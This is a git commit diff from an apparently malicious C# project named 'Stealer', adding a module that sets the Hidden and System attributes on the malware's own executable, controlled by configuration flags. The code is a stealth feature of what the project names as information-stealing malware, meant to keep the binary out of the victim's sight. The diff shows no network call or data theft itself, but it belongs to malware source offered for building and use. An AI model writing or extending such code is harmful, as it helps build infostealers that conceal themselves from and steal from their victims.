e0373500eab472d6a4a4c9daa956a75828ed1210
manolia <62712893+manolia@users.noreply.github.com>
2021-05-01 18:03:09 +0200

    Added system and hidden attribute to config system

--- Stealer/Stealer/Modules/Attributes.cs
+++ Stealer/Stealer/Modules/Attributes.cs
@@ -1,12 +1,25 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+﻿using System.IO;
 
 namespace Stealer.Modules
 {
-    class Attributes
+    internal sealed class Attributes
     {
+        // File path
+        private static string executable = System.Reflection.Assembly.GetEntryAssembly().Location;
+        private static FileInfo file = new FileInfo(executable);
+
+        // Add 'hidden' attribute to file
+        public static void set_hidden()
+        {
+            if (config.attribute_hidden)
+                file.Attributes |= FileAttributes.Hidden;
+        }
+
+        // Add 'system' attribute to file
+        public static void set_system()
+        {
+            if (config.attribute_system)
+                file.Attributes |= FileAttributes.System;
+        }
     }
 }
